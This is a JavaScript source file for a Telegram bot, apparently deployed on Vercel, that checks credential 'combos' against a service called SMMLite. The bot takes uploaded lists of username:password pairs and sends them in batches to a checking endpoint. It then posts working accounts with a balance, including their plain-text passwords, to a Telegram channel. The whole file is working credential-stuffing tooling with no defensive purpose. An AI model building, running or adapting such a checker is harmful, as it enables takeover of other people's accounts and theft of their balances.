// api/telegram.js – SMMLite with batch processing and fixed HIT detection
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';

const BATCH_SIZE = 50;

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const body = req.body;
  if (!body.message) return res.status(200).json({ ok: true });

  const chatId = body.message.chat.id;
  const text = body.message.text;
  const document = body.message.document;

  if (text === '/start') {
    await sendMessage(chatId, "🤖 SMMLite Checker Bot\nSend a .txt file with combos (user:pass each line).\nI'll check in batches and forward HITs (balance ≥ $0.003) to the channel.");
    return res.status(200).json({ ok: true });
  }

  if (document && document.mime_type === 'text/plain') {
    const fileId = document.file_id;
    const fileUrl = await getFileUrl(fileId);
    if (!fileUrl) {
      await sendMessage(chatId, "❌ Failed to get file.");
      return res.status(200).json({ ok: false });
    }

    const fileContent = await downloadFile(fileUrl);
    if (!fileContent) {
      await sendMessage(chatId, "❌ Failed to download file.");
      return res.status(200).json({ ok: false });
    }

    const lines = fileContent.split(/\r?\n/);
    const combos = [];
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed) continue;
      const idx = trimmed.indexOf(':');
      if (idx === -1) continue;
      const user = trimmed.slice(0, idx).trim();
      const pass = trimmed.slice(idx+1).trim();
      if (user && pass) combos.push(`${user}:${pass}`);
    }

    if (combos.length === 0) {
      await sendMessage(chatId, "❌ No valid combos found in file (format: user:pass)");
      return res.status(200).json({ ok: false });
    }

    await sendMessage(chatId, `📥 Received ${combos.length} combos. Checking in batches of ${BATCH_SIZE}...`);

    let totalHits = 0;
    let totalChecked = 0;
    const allHits = [];

    // ব্যাচে প্রসেস
    for (let i = 0; i < combos.length; i += BATCH_SIZE) {
      const batch = combos.slice(i, i + BATCH_SIZE);
      const batchNum = Math.floor(i / BATCH_SIZE) + 1;
      const totalBatches = Math.ceil(combos.length / BATCH_SIZE);

      const results = await checkBatch(batch);
      
      for (const res of results) {
        totalChecked++;
        if (res.valid && res.hit) {
          totalHits++;
          // combo থেকে ইউজারনেম ও পাসওয়ার্ড আলাদা
          const [username, password] = res.combo.split(':');
          allHits.push({ ...res, username, password });
          await forwardToChannel(username, password, res);
        }
      }

      if (totalBatches > 1) {
        await sendMessage(chatId, `⏳ Batch ${batchNum}/${totalBatches} done (${Math.min(i + BATCH_SIZE, combos.length)}/${combos.length}) | Hits so far: ${totalHits}`);
      }
    }

    // সারাংশ
    let summary = `✅ Checking complete!\nTotal: ${combos.length}\n💰 HITS: ${totalHits}\n`;
    if (allHits.length > 0) {
      summary += `\n📋 HIT combos:\n`;
      allHits.forEach(h => {
        summary += `${h.username}:${h.password} | $${parseFloat(h.balance).toFixed(6)}\n`;
      });
    }
    await sendMessage(chatId, summary);
    return res.status(200).json({ ok: true });
  }

  return res.status(200).json({ ok: true });
}

// ---------- ব্যাচ চেক ফাংশন ----------
async function checkBatch(batch) {
  try {
    const baseUrl = process.env.VERCEL_URL 
      ? `https://${process.env.VERCEL_URL}` 
      : 'https://smmlitetgversion.vercel.app';
    
    const response = await fetch(`${baseUrl}/api/check`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ combos: batch })
    });
    const data = await response.json();
    return data.results || [];
  } catch (err) {
    return batch.map(combo => {
      const [username, password] = combo.split(':');
      return { combo, username, password, valid: false, hit: false, balance: 0, message: `Error: ${err.message}` };
    });
  }
}

// ---------- হেল্পার ফাংশন ----------
async function sendMessage(chatId, text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text })
    });
  } catch(e) {}
}

async function getFileUrl(fileId) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${fileId}`;
  const res = await fetch(url);
  const data = await res.json();
  if (data.ok && data.result.file_path) {
    return `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${data.result.file_path}`;
  }
  return null;
}

async function downloadFile(fileUrl) {
  const res = await fetch(fileUrl);
  return await res.text();
}

async function forwardToChannel(username, password, result) {
  if (!TELEGRAM_CHAT_ID) return;
  const message = `🎯 *HIT on SMMLite By @shakib2016*\n\n` +
                  `👤 *Username:* ${username}\n` +
                  `🔑 *Password:* \`${password}\`\n` +
                  `💰 *Balance:* $${parseFloat(result.balance).toFixed(6)}\n\n` +
                  `#SMMLite @shakib2016 #HIT`;
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
  } catch(e) {}
}
